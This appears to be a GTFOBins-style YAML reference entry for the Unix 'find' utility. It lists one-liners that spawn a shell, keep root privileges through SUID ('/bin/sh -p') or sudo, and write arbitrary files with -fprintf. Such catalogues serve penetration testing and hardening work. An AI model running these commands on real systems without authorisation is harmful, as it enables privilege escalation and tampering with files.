---
functions:
  shell:
    - code: find . -exec /bin/sh \; -quit
  suid:
    - code: ./find . -exec /bin/sh -p \; -quit
  sudo:
    - code: sudo find . -exec /bin/sh \; -quit
  file-write:
    - description: DATA is a format string, it supports some escape sequences 
      code: |
        TD=$(mktemp -d)
        touch $TD/dummy
        find $TD -type f -fprintf file_to_write DATA
---
